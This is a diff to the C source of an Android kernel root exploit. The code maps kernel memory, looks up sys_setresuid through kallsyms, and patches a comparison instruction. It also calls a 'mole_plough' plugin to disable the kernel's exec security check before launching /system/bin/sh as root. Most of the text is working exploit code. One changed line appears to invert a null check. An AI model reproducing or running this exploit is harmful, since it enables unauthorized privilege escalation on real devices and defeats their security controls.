@@ -97,22 +97,6 @@ get_sys_setresuid_address(void)
   return get_sys_setresuid_address_from_kallayms();
 }
 
-static unsigned long int
-get_sys_setresuid_address_in_memory(void *kernel_memory)
-{
-  kallsyms *kallsyms;
-  unsigned long int address;
-
-  kallsyms = kallsyms_in_memory_init(kernel_memory, 0x1000000);
-  if (!kallsyms) {
-    return 0;
-  }
-
-  address = kallsyms_in_memory_lookup_name(kallsyms, "sys_setresuid");
-
-  return address;
-}
-
 static bool
 inject_command(const char *command,
                unsigned long int sys_setresuid_address)
@@ -170,12 +154,12 @@ attempt_diag_exploit(unsigned long int sys_setresuid_address)
 
 static uint32_t cmp_operation_code = 0xe3500000;
 static void*
-find_cmp_operation_address_in_sys_setresuid(void *mmap_base_address)
+find_cmp_operation_address_in_sys_setresuid(kallsyms *kallsyms, void *mmap_base_address)
 {
   void *mapped_sys_setresuid_address;
   unsigned long int sys_setresuid_address = 0;
 
-  sys_setresuid_address = get_sys_setresuid_address_in_memory(mmap_base_address);
+  sys_setresuid_address = kallsyms_in_memory_lookup_name(kallsyms, "sys_setresuid");
   if (!sys_setresuid_address) {
     printf("Failed to get sys_setresuid address due to %s\n", strerror(errno));
     return NULL;
@@ -185,13 +169,41 @@ find_cmp_operation_address_in_sys_setresuid(void *mmap_base_address)
   return memmem(mapped_sys_setresuid_address, 0x100, &cmp_operation_code, sizeof(cmp_operation_code));
 }
 
+static mole_plough_plugins *plugin_handler;
+
+static bool
+disable_exec_security_check(kallsyms *kallsyms, void *mmap_base_address, void *user_data)
+{
+  int ret;
+
+  mole_plough_plugin_resolve_symbols(kallsyms, plugin_handler);
+
+  ret = mole_plough_plugin_disable_exec_security_check(plugin_handler,
+                                                       fb_mem_convert_to_mmaped_address,
+                                                       mmap_base_address);
+  return (ret == 0);
+}
+
 static bool
 fb_mem_exploit_callback(void *mmap_base_address, void *user_data)
 {
   int ret;
   int *cmp_operation;
+  kallsyms *kallsyms;
 
-  cmp_operation = find_cmp_operation_address_in_sys_setresuid(mmap_base_address);
+  plugin_handler = mole_plough_static_plugin_register();
+  if (plugin_handler) {
+    return false;
+  }
+
+  kallsyms = kallsyms_in_memory_init(mmap_base_address, 0x1000000);
+  if (!kallsyms) {
+    return false;
+  }
+
+  disable_exec_security_check(kallsyms, mmap_base_address, user_data);
+
+  cmp_operation = find_cmp_operation_address_in_sys_setresuid(kallsyms, mmap_base_address);
   if (!cmp_operation) {
     return false;
   }
@@ -232,40 +244,6 @@ run_other_exploits(void)
   return attempt_diag_exploit(sys_setresuid_address);
 }
 
-static mole_plough_plugins *plugin_handler;
-
-static bool
-disable_exec_security_check(void *mmap_base_address, void *user_data)
-{
-  int ret;
-  kallsyms *kallsyms;
-
-  kallsyms = kallsyms_in_memory_init(mmap_base_address, 0x1000000);
-  if (!kallsyms) {
-    return false;
-  }
-
-  plugin_handler = mole_plough_static_plugin_register();
-  if (!plugin_handler) {
-    kallsyms_in_memory_free(kallsyms);
-    return false;
-  }
-
-  mole_plough_plugin_resolve_symbols(kallsyms, plugin_handler);
-
-  ret = mole_plough_plugin_disable_exec_security_check(plugin_handler,
-                                                       fb_mem_convert_to_mmaped_address,
-                                                       mmap_base_address);
-  kallsyms_in_memory_free(kallsyms);
-  return (ret == 0);
-}
-
-static bool
-attempt_to_disable_exec_security_check(void)
-{
-  return fb_mem_run_exploit(disable_exec_security_check, NULL);
-}
-
 #define SHELL_PATH "/system/bin/sh"
 
 int
@@ -279,14 +257,7 @@ main(int argc, char **argv)
   if (execl(SHELL_PATH, SHELL_PATH, NULL) == 0) {
     exit(EXIT_SUCCESS);
   }
-  if (errno != EPERM) {
-    printf("Failed to execute shell due to %s.\n", strerror(errno));
-  }
-
-  if (!attempt_to_disable_exec_security_check()) {
-    exit(EXIT_FAILURE);
-  }
-  return execl(SHELL_PATH, SHELL_PATH, NULL);
+  exit(EXIT_FAILURE);
 }
 /*
 vi:ts=2:nowrap:ai:expandtab:sw=2
